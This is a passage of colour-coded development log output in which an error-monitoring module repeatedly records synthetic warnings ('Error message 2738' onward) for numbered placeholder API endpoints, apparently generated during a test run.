WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2738'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834609Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2739'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2740'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834708Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2741'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2742'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834809Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2743'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2744'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834908Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2745'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.834956Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2746'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2747'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2748'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m55[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2749'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835202Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2750'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835274Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2751'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2752'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835384Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2753'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2754'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835484Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2755'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2756'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2757'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835633Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2758'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2759'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835799Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2760'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835856Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2761'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2762'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.835957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2763'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2764'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2765'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2766'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836157Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2767'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2768'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2769'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836302Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2770'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836351Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2771'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2772'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836448Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2773'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2774'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2775'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2776'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.836641Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m56[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2777'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
